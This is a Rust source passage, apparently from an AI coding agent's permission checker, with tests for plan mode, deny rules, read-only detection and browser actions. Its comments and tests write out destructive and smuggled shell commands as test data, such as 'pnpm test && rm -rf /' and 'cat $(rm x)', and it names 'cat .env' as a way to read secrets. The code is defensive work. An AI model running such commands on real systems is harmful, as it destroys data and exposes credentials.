        format!(" — {description}")
    };
    Some(format!(
        "FileRestrictionError: Agent `{agent_name}` cannot use `{tool}` on `{display_path}`; the path must be inside the project and match fileRegex `{pattern}`{description}."
    ))
}

/// Collapse `.` and `..` in a path the filesystem could not resolve.
///
/// Without this, re-attaching a tail like `src/../src/x.rs` to a canonicalised
/// root leaves the `..` in place, so a path that *is* inside the root compares
/// as outside. `open_path` only ever gets paths that exist, so this matters
/// mainly for the write arm — where failing closed is the safe direction, but
/// it made the write prompt fire on paths the user had every reason to expect
/// to be allowed.
fn lexical_normalize(p: &Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::CurDir => {}
            Component::ParentDir => {
                // Only pop a real, named directory: never above the root, and
                // never past a prefix (`C:`) or the leading separator.
                let can_pop = out
                    .components()
                    .next_back()
                    .is_some_and(|c| matches!(c, Component::Normal(_)));
                if can_pop {
                    out.pop();
                }
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// The plan-mode refusals, kept as constants because tests and the UI quote them.
const PLAN_DENY_EDIT: &str = "Plan mode is active: you can't modify files yet. Finish exploring, then call exit_plan_mode with your plan.";
const PLAN_DENY_CMD: &str = "Plan mode is active: only read-only commands may run. Call exit_plan_mode with your plan first.";

/// The disabled rung's refusal. Distinct from a deny rule so the user can tell
/// "you turned this off" from "you wrote a rule against it".
const DISABLED_MSG: &str = "This task's permission rung is Disabled, so nothing but read-only commands runs. Raise it in the permission menu (or Settings → Permissions) to allow edits and commands.";

/// The user-authored deny *command* rules that fire for this call, in order.
/// Only the bash arm consults this — it is the only arm that runs a command
/// line. The plugin arms match their own named rules (see `plugin_deny`).
fn command_denies<'a>(input: &Value, ctx: &Ctx<'a>) -> Vec<&'a str> {
    let cmd = input["command"].as_str().unwrap_or("");
    if cmd.is_empty() {
        return vec![];
    }
    ctx.allow
        .iter()
        .filter_map(|r| {
            let pat = deny_pattern(&r.pattern)?;
            (rule_scope_matches(&r.project, ctx.project)
                && (deny_matches(pat, cmd) || named_path_reached(pat, cmd, ctx.cwd)))
            .then_some(r.pattern.as_str())
        })
        .collect()
}

/// The whole deny tier. `Some(Decision)` means a deny fired and `check` returns
/// it immediately; `None` means the call continues to the rung logic.
///
/// Order matters and is the point of the tier: this runs **before** the
/// read-only shortcut, before `ctx.plan` and before any allow-list or rung, so a
/// user-authored deny always wins — including over Turbo and over a command that
/// would otherwise be classified read-only.
fn deny_tier(
    tool: &str,
    input: &Value,
    resolved_path: Option<&str>,
    ctx: &Ctx,
) -> Option<Decision> {
    // The built-in env deny. A read is a credential-exfil primitive, so this is
    // the one place a *read* is gated at all. It fires only for the tools that
    // hand back a file's bytes — `grep`/`glob` can find an env file, but that
    // leaks no secret, and prompting there was judged noise.
    if ctx.env_files_denied()
        && matches!(tool, "read_file" | "view_image")
        && resolved_path.is_some_and(is_env_path)
        && !env_allows_file(ctx.allow, ctx.project, resolved_path.unwrap_or(""), ctx.cwd)
    {
        return Some(Decision::Deny(ENV_DENY_MSG.to_string()));
    }
    // The same env deny, for the shell: a `read_file` deny is decorative if
    // `cat .env` walks straight past it. Deliberately narrow in two ways: only a
    // *file-dumping* command (the ones whose strings are file contents — not
    // `grep`/`rg`, whose match line could leak a secret too but which also
    // legitimately search for the word `.env`, and not `ls`/`find`, which only
    // learn the file exists), and only an env file named as a whole word. Each
    // such word is judged on its own, so allowing one env file does not open the
    // others. Heuristic by design: the goal is the common exfil (`cat .env`),
    // and `set -a; . .env` is out of reach of any string check.
    if matches!(tool, "bash" | "shell") && ctx.env_files_denied() {
        let cmd = input["command"].as_str().unwrap_or("");
        if read_only_command(cmd) && dumps_file_contents(cmd) {
            let env_words: Vec<&str> = cmd
                .split_whitespace()
                .map(|w| w.trim_matches(|c: char| "\"'`".contains(c)))
                .filter(|w| is_env_path(w))
                .collect();
            if env_words
                .iter()
                .any(|w| !env_allows_file(ctx.allow, ctx.project, w, ctx.cwd))
            {
                return Some(Decision::Deny(ENV_CMD_DENY_MSG.to_string()));
            }
        }
    }
    // A deny rule written against the path itself, for the tools that hand back
    // a file's bytes (`!read_file .env`, `!*.pem`). Checked after the built-in
    // env deny so the specific rule and the default are both reachable.
    if matches!(tool, "read_file" | "view_image") {
        if let Some(p) = resolved_path.filter(|p| !p.is_empty()) {
            if let Some(msg) = read_path_denied(tool, p, ctx) {
                return Some(Decision::Deny(msg));
            }
        }
    }
    // The plugin arms name their action in the rule, so they match on the
    // composed `github:create_issue` / `browser:click` / `computer *` form the
    // UI writes, not on a command line.
    if let Some(msg) = plugin_deny(tool, input["action"].as_str().unwrap_or(""), ctx) {
        return Some(Decision::Deny(msg));
    }
    // Every other tool: an exact `tool` / `tool *` deny rule.
    if let Some(msg) = named_deny(tool, ctx) {
        return Some(Decision::Deny(msg));
    }
    if matches!(tool, "bash" | "shell") {
        let hits = command_denies(input, ctx);
        if !hits.is_empty() {
            // Name every rule that fired, not just the first: a command that
            // trips `rm -rf *` *and* `__APP_CWD__/.env` should say both.
            return Some(Decision::Deny(denied_message(&hits.join("`, `"))));
        }
    }
    None
}

pub fn check(tool: &str, input: &Value, resolved_path: Option<&str>, ctx: &Ctx) -> Decision {
    // Deny first, over everything. See `deny_tier`.
    //
    // **Do not move this below the read-only shortcut.** It looks like it would
    // be cheaper there — the read-only arm returns `Allow` for most calls, so the
    // deny scan runs for a minority — but the whole tier is only a deny if it
    // beats the read-only classification, and a user who denies `git status` or
    // `ls` means it. A deny rule that loses to the read-only shortcut is a bypass.
    if let Some(d) = deny_tier(tool, input, resolved_path, ctx) {
        return d;
    }
    // Read-only tools and commands run on every rung below Turbo, so an agent can
    // always explore. (A deny rule has already had its chance above.)
    if is_read_only_tool(tool) {
        return Decision::Allow;
    }
    let rung = ctx.rung();
    // On the Disabled rung only read-only commands run; everything that would
    // have asked is refused instead. Checked before plan mode so the user gets
    // the reason they actually set.
    let disabled = rung == Rung::Disabled;
    match tool {
        "write_file" | "edit_file" | "multi_edit" => {
            let path = resolved_path.unwrap_or("");
            if ctx.plan {
                return Decision::Deny(PLAN_DENY_EDIT.into());
            }
            let outside = !inside(path, ctx.cwd);
            if rung == Rung::Turbo {
                return Decision::Allow;
            }
            if rung == Rung::Auto && !outside {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            let verb = if tool == "write_file" {
                "Write"
            } else {
                "Edit"
            };
            Decision::Ask {
                title: format!("{verb} {}", short(path, ctx.cwd)),
                detail: path.to_string(),
                reason: if outside {
                    "This file is outside the task's working directory.".into()
                } else {
                    "Allowlist-only mode: every edit needs your approval.".into()
                },
                rule: None,
            }
        }
        "artifact_create" | "artifact_revise" | "artifact_respond" => {
            // Artifacts are project-scoped durable writes, not arbitrary model
            // paths. Use the project root as the scope checked by the same
            // permission ladder as file writes; an isolated subagent worktree
            // is deliberately outside that root and therefore needs approval.
            let path = resolved_path.unwrap_or("");
            if ctx.plan {
                return Decision::Deny(PLAN_DENY_EDIT.into());
            }
            let outside = !inside(path, ctx.cwd);
            if rung == Rung::Turbo || (rung == Rung::Auto && !outside) {
                return Decision::Allow;
            }
            let rule = tool.to_string();
            let allowed = ctx.allow.iter().any(|r| {
                deny_pattern(&r.pattern).is_none()
                    && rule_scope_matches(&r.project, ctx.project)
                    && (r.pattern == rule || r.pattern == format!("{tool} *"))
            });
            if allowed {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            let verb = match tool {
                "artifact_create" => "Create artifact",
                "artifact_revise" => "Revise artifact",
                _ => "Respond to artifact feedback",
            };
            let summary = match tool {
                "artifact_create" => format!(
                    "{} · {}",
                    input["title"].as_str().unwrap_or("Untitled"),
                    input["kind"].as_str().unwrap_or("artifact")
                ),
                "artifact_revise" => format!(
                    "{} · {} · {}",
                    input["id"].as_str().unwrap_or("artifact"),
                    input["title"].as_str().unwrap_or("Untitled"),
                    input["kind"].as_str().unwrap_or("artifact")
                ),
                _ => format!(
                    "{} · {}",
                    input["feedback_id"].as_str().unwrap_or("unknown feedback"),
                    input["decision"].as_str().unwrap_or("response")
                ),
            };
            Decision::Ask {
                title: format!("{verb} in {}", short(path, ctx.cwd)),
                detail: format!("{path}\n{summary}"),
                reason: if outside {
                    "This artifact is outside the task's working directory.".into()
                } else {
                    "Allowlist-only mode: every artifact change needs your approval.".into()
                },
                rule: Some(rule),
            }
        }
        "bash" | "shell" => {
            let cmd = input["command"].as_str().unwrap_or("");
            let ro = read_only_command(cmd);
            if ctx.plan && !ro {
                return Decision::Deny(PLAN_DENY_CMD.into());
            }
            if ro {
                return Decision::Allow;
            }
            if rung == Rung::Turbo {
                return Decision::Allow;
            }
            // Match on the command without its `cd`/wrapper prefix: a rule the
            // user allowed for `npm test` covers `cd web && timeout 30 npm test`.
            let bare = strip_leading_cd_loop(cmd);
            if allow_hit(cmd, ctx) {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            Decision::Ask {
                title: "Run command".into(),
                detail: cmd.to_string(),
                reason: if rung == Rung::Auto {
                    "Auto-edit doesn't cover commands with side effects.".into()
                } else {
                    "Allowlist-only mode: commands need your approval.".into()
                },
                rule: Some(suggest_rule(bare)),
            }
        }
        "kill_bash" => Decision::Allow,
        // Plugins: the runner only gates GitHub writes and computer actions (reads/screenshots skip this).
        "github" | "computer" => {
            let action = input["action"].as_str().unwrap_or("");
            if ctx.plan {
                return Decision::Deny(format!("Plan mode is active: {tool} `{action}` is disabled until the plan is approved. Read-only actions still work."));
            }
            let rule = if tool == "github" {
                format!("github:{action}")
            } else {
                "computer *".to_string()
            };
            let allowed = ctx.allow.iter().any(|r| {
                deny_pattern(&r.pattern).is_none()
                    && (r.pattern == rule || r.pattern == format!("{tool} *"))
            });
            if rung == Rung::Turbo || allowed {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            let (title, reason) = if tool == "github" {
                (
                    format!("GitHub · {}", action.replace('_', " ")),
                    "This changes things on GitHub as you.",
                )
            } else {
                (format!("Computer · {}", super::plugins::computer_summary(input).chars().take(90).collect::<String>()), "The agent wants to use your mouse/keyboard. Always-allow covers every computer action.")
            };
            let mut shown = input.clone();
            if let Some(o) = shown.as_object_mut() {
                o.remove("action");
            }
            Decision::Ask {
                title,
                detail: serde_json::to_string_pretty(&shown).unwrap_or_default(),
                reason: reason.into(),
                rule: Some(rule),
            }
        }
        // The browser plugin, for the two actions that change a site. The reads
        // never reach here — the runner lets `navigate`/`read`/`screenshot`/`js`
        // through, because they touch nothing of the user's and nothing of the
        // site's either.
        //
        // A browser is not the user's screen, so "always" is offered per action
        // rather than as one blanket `browser *`: allowing clicks forever is a
        // much larger grant than allowing them in this project, and unlike
        // `computer *` it does not hand over a mouse and keyboard.
        "browser" => {
            let action = input["action"].as_str().unwrap_or("");
            // The reads never reach here in practice (the runner lets them
            // through), but if one does it must not be treated as a write:
            // reading and screenshotting pages is how a plan gets its facts, and
            // plan mode is about not *doing* things, not not looking.
            if !matches!(action, "click" | "type") {
                return Decision::Allow;
            }
            if ctx.plan {
                return Decision::Deny("Plan mode is active: clicking and typing on a page are disabled until the plan is approved. Reading and screenshotting pages still work.".into());
            }
            let rule = format!("browser:{action}");
            let allowed = ctx.allow.iter().any(|r| {
                deny_pattern(&r.pattern).is_none()
                    && (r.pattern == rule || r.pattern == "browser *")
            });
            if rung == Rung::Turbo || allowed {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            let what = input["detail"].as_str().unwrap_or(action);
            Decision::Ask {
                title: format!("Browser · {}", action),
                detail: format!("{what}\n\non {}", input["__page"].as_str().unwrap_or("the current page")),
                reason: "This clicks or types on a real site, which can submit something. The agent's browser is a throwaway profile — it is not carrying your cookies or logins.".into(),
                rule: Some(rule),
            }
        }
        t if t.starts_with("mcp__") => {
            if ctx.plan {
                return Decision::Deny(
                    "Plan mode is active: external tools are disabled until the plan is approved."
                        .into(),
                );
            }
            let rule = format!("{} *", t);
            let allowed = ctx.allow.iter().any(|r| {
                deny_pattern(&r.pattern).is_none() && (r.pattern == rule || r.pattern == t)
            });
            if rung == Rung::Turbo || allowed {
                return Decision::Allow;
            }
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            Decision::Ask {
                title: format!("Use {}", t.replacen("mcp__", "", 1).replace("__", " → ")),
                detail: serde_json::to_string_pretty(input).unwrap_or_default(),
                reason: "MCP tools can reach outside this machine.".into(),
                rule: Some(rule),
            }
        }
        _ => {
            if disabled {
                return Decision::Deny(DISABLED_MSG.into());
            }
            Decision::Ask {
                title: format!("Use {tool}"),
                detail: input.to_string(),
                reason: String::new(),
                rule: None,
            }
        }
    }
}

/// Apply repeat protection without overriding hard policy denials.
pub fn check_with_repeats(
    tool: &str,
    input: &Value,
    resolved_path: Option<&str>,
    ctx: &Ctx,
    repeats: u32,
) -> Decision {
    let base = check(tool, input, resolved_path, ctx);
    if matches!(base, Decision::Deny(_)) {
        return base;
    }
    match doom_loop_decision(tool, input, repeats) {
        // Full Access must not introduce approval cards for repeated work, but
        // the hard cutoff still stops runaway loops without user interaction.
        Some(Decision::Ask { .. }) if ctx.rung() == Rung::Turbo => base,
        Some(decision) => decision,
        None => base,
    }
}

pub fn short(path: &str, cwd: &str) -> String {
    let p = Path::new(path);
    p.strip_prefix(cwd)
        .map(|r| r.to_string_lossy().replace('\\', "/"))
        .unwrap_or_else(|_| path.replace('\\', "/"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn preview_is_available_in_plan_and_disabled_modes() {
        let input = json!({"title":"Preview", "kind":"html", "content":"<h1>Hi</h1>"});
        for (perm, plan) in [("disabled", false), ("full", true)] {
            let ctx = Ctx {
                perm,
                plan,
                cwd: "D:/openleash",
                project: "D:/openleash",
                allow: &[],
            };
            assert!(matches!(
                check("artifact_preview", &input, None, &ctx),
                Decision::Allow
            ));
        }
        assert!(is_read_only_tool("artifact_preview"));
    }

    #[test]
    fn unset_permission_uses_full_access_but_unknown_values_fail_closed() {
        assert_eq!(Rung::of(""), Rung::Turbo);
        assert_eq!(Rung::of("future-mode"), Rung::Allowlist);
    }

    #[test]
    fn full_access_repeats_do_not_ask_but_still_stop_runaway_commands() {
        let input = json!({"command": "npm test && npm run build"});
        for perm in ["full", "turbo"] {
            let ctx = Ctx {
                perm,
                plan: false,
                cwd: "D:/openleash",
                project: "D:/openleash",
                allow: &[],
            };
            for repeats in 0..DOOM_LOOP_AT * 3 - 1 {
                assert!(matches!(
                    check_with_repeats("bash", &input, None, &ctx, repeats),
                    Decision::Allow
                ));
            }
            assert!(matches!(
                check_with_repeats("bash", &input, None, &ctx, DOOM_LOOP_AT * 3 - 1),
                Decision::Deny(_)
            ));
            assert!(matches!(
                check_with_repeats("bash", &input, None, &Ctx { plan: true, ..ctx }, 2),
                Decision::Deny(_)
            ));
            let deny = [AllowRule {
                pattern: "!npm test *".into(),
                project: String::new(),
            }];
            assert!(matches!(
                check_with_repeats(
                    "bash",
                    &input,
                    None,
                    &Ctx {
                        allow: &deny,
                        ..ctx
                    },
                    2
                ),
                Decision::Deny(_)
            ));
            assert!(matches!(
                check_with_repeats(
                    "bash",
                    &input,
                    None,
                    &Ctx {
                        perm: "auto",
                        ..ctx
                    },
                    2
                ),
                Decision::Ask { .. }
            ));
        }
    }

    #[test]
    fn read_only_detection() {
        assert!(is_read_only_command("git status"));
        assert!(is_read_only_command("ls -la | grep foo"));
        assert!(is_read_only_command("git log --oneline -5"));
        assert!(!is_read_only_command("rm -rf node_modules"));
        assert!(!is_read_only_command("echo hi > file.txt"));
        assert!(!is_read_only_command("git push"));
        assert!(!is_read_only_command("git branch -D main"));
        assert!(!is_read_only_command("ls && rm x"));
        assert!(!is_read_only_command("cat $(rm x)"));
    }

    #[test]
    fn rules() {
        assert!(matches_rule("pnpm test *", "pnpm test src/lib"));
        assert!(matches_rule("pnpm test *", "pnpm test"));
        assert!(!matches_rule("pnpm test *", "pnpm testing"));
        assert!(!matches_rule("pnpm test *", "pnpm test && rm -rf /"));
        assert!(matches_rule("pnpm lint", "pnpm lint"));
        assert!(!matches_rule("pnpm lint", "pnpm lint --fix"));
        assert!(matches_rule("git status*", "git status -s"));
        assert_eq!(
            suggest_rule("pnpm db:migrate --env=staging"),
            "pnpm db:migrate *"
        );
    }

    /// The shell already starts in the working directory, so a leading `cd`
    /// is redundant — and must not change what the command is judged to be.
    #[test]
    fn leading_cd_is_stripped() {
        assert_eq!(
            strip_leading_cd("cd D:/openleash && git push origin main"),
            Some("git push origin main")
        );
        assert_eq!(strip_leading_cd("  cd ~/proj && ls -la"), Some("ls -la"));
        assert_eq!(strip_leading_cd("cd web; npm test"), Some("npm test"));
        assert_eq!(strip_leading_cd("CD ../sibling && ls"), Some("ls"));
        assert_eq!(
            strip_leading_cd("pushd src && cargo test"),
            Some("cargo test")
        );
        // The last segment still belongs to the command, not the `cd`.
        assert_eq!(
            strip_leading_cd("cd src && ls && wc -l"),
            Some("ls && wc -l")
        );
        // Quoted paths with spaces aren't plain paths — left to the checker.
        assert_eq!(
            strip_leading_cd("cd \"C:/my project\" && npm run build"),
            None
        );
    }

    #[test]
    fn leading_cd_only_strips_a_plain_change() {
        // Nothing to strip.
        assert_eq!(strip_leading_cd("git status"), None);
        assert_eq!(strip_leading_cd("npm test"), None);
        assert_eq!(strip_leading_cd("cd"), None);
        assert_eq!(strip_leading_cd("cd "), None);
        // Flags and substitutions change meaning — leave them to the checker.
        assert_eq!(strip_leading_cd("cd - && ls"), None);
        assert_eq!(strip_leading_cd("cd -- && ls"), None);
        assert_eq!(strip_leading_cd("cd -P /tmp && ls"), None);
        assert_eq!(strip_leading_cd("cd $(dirname $0) && ls"), None);
        assert_eq!(strip_leading_cd("cd a/b | ls"), None);
        // Only a leading `cd` counts: a later one is a real directory change.
        assert_eq!(strip_leading_cd("ls && cd src"), None);
    }

    #[test]
    fn cd_prefix_does_not_change_read_only_verdict() {
        // Still read-only: a `cd` habit must not need approval.
        assert!(read_only_command("cd D:/openleash && git status"));
        assert!(read_only_command("cd src && ls -la | grep foo"));
        // Still not read-only: the prefix must not smuggle a write through.
        assert!(!read_only_command(
            "cd D:/openleash && git push origin main"
        ));
        assert!(!read_only_command("cd /tmp && rm -rf node_modules"));
        assert!(!read_only_command("cd /tmp && echo hi > file.txt"));
        assert!(!read_only_command("cd src && git branch -D main"));
        // The write is still hidden behind a quoted `cd`: judged as written.
        assert!(!read_only_command("cd \"C:/my project\" && git push"));
    }

    /// An "always allow" rule the user approved must still match when the
    /// agent prefixes the same command with `cd`.
    #[test]
    fn allow_rules_survive_a_cd_prefix() {
        let allow = vec![AllowRule {
            pattern: "npm test *".into(),
            project: "D:/openleash".into(),
        }];
        let ctx = Ctx {
            perm: "auto",
            plan: false,
            cwd: "D:/openleash",
            project: "D:/openleash",
            allow: &allow,
        };
        // The rule was saved for `npm test …`, so the `cd` version is covered.
        assert!(matches!(
            check(
                "bash",
                &json!({"command": "cd D:/openleash && npm test"}),
                None,
                &ctx
            ),
            Decision::Allow
        ));
        assert!(matches!(
            check(
                "bash",
                &json!({"command": "cd D:/openleash && npm test -- --watch"}),
                None,
                &ctx
            ),
            Decision::Allow
        ));
        // A different command is still not covered by it.
        assert!(!matches!(
            check(
                "bash",
                &json!({"command": "cd D:/openleash && npm publish"}),
                None,
                &ctx
            ),
            Decision::Allow
        ));
        // The rule offered to the user for a `cd`-prefixed command is the
        // command itself, so approving it doesn't bake the prefix in.
        let ask = check(
            "bash",
            &json!({"command": "cd D:/openleash && npm publish"}),
            None,
            &Ctx { perm: "ask", ..ctx },
        );
        assert!(matches!(ask, Decision::Ask { rule: Some(r), .. } if r == "npm publish *"));
    }

    /// The browser plugin is the one thing that can act on the web without ever
    /// touching the user's screen, so its boundary has to hold: reading a page
    /// is free, and the two actions that change a site ask.
    #[test]
    fn clicking_and_typing_ask_while_reading_a_page_does_not() {
        let ctx = Ctx {
            perm: "ask",
            plan: false,
            cwd: "D:/openleash",
            project: "D:/openleash",
            allow: &[],
        };
        for act in ["click", "type"] {
            let d = check(
                "browser",
                &json!({"action": act, "detail": "click `#go`", "__page": "https://example.com"}),
                None,
                &ctx,
            );
            assert!(matches!(d, Decision::Ask { .. }), "{act} should ask");
        }
        // The reads never reach `check` at all (the runner lets them through), so
        // a verdict here would only be a fallback. They must not be asks.
        for act in ["navigate", "read", "screenshot", "js", "info", "back"] {
            let d = check("browser", &json!({"action": act}), None, &ctx);
            assert!(!matches!(d, Decision::Ask { .. }), "{act} must not ask");
        }
    }

    /// Plan mode is for proposing, not acting. Reading pages is still fine —
    /// that is how a plan gets its facts — but a click can submit something.
    #[test]
    fn plan_mode_denies_browser_writes_but_not_reads() {
        let ctx = Ctx {
            perm: "full",
            plan: true,
            cwd: "D:/openleash",
            project: "D:/openleash",
            allow: &[],
        };
        // Full access does not override plan mode.
        for act in ["click", "type"] {
            assert!(
                matches!(
                    check("browser", &json!({"action": act}), None, &ctx),
                    Decision::Deny(_)
                ),
                "{act} must be denied in plan mode"
            );
        }
        for act in ["navigate", "read", "screenshot", "js"] {
            assert!(
                !matches!(
                    check("browser", &json!({"action": act}), None, &ctx),
                    Decision::Deny(_)
                ),
                "{act} must stay available in plan mode"
            );
        }
    }

    /// "Always" is offered per action, so a user who is happy with clicks does
    /// not also hand over every future keystroke to a page.
    #[test]
    fn an_always_rule_covers_one_action_not_all_of_them() {
        let allow = vec![AllowRule {
            pattern: "browser:click".into(),
            project: "D:/openleash".into(),
        }];
        let ctx = Ctx {
            perm: "ask",
            plan: false,
            cwd: "D:/openleash",
            project: "D:/openleash",
            allow: &allow,
        };
        assert!(matches!(
            check("browser", &json!({"action": "click"}), None, &ctx),
            Decision::Allow
        ));
        // Typing is a separate grant, and must still ask.
        assert!(matches!(
            check("browser", &json!({"action": "type"}), None, &ctx),
            Decision::Ask { .. }
        ));
        // And the rule offered for a click is scoped to clicking, not to typing.
        let none: &[AllowRule] = &[];
        let bare = Ctx {
            perm: "ask",
            plan: false,
            cwd: "D:/openleash",
            project: "D:/openleash",
            allow: none,
        };
        let ask = check("browser", &json!({"action": "click"}), None, &bare);
        assert!(
            matches!(ask, Decision::Ask { rule: Some(r), .. } if r == "browser:click"),
            "the offered rule should be per-action"
        );
    }
}
